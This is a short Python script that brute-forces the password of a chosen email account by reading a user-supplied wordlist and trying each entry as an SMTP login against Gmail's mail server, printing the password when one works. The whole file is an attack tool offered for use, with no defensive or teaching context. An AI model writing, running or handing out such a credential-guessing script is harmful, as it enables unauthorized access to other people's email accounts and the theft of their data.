import smtplib,os
email=input('Enter The Email You want to Brute-Force')
passwordfile=input('Enter the full path of your Password file')
conn=smtplib.SMTP('smtp.gmail.com',587)
conn.ehlo()
conn.starttls()
file=open(passwordfile,'r')
for passw in file:
    try:
     conn.login(email,passw)
     print('password found :%s'%passw)
     break
    except smtplib.SMTPAuthenticationError:
      print('Password incorrect :%s'%passw)


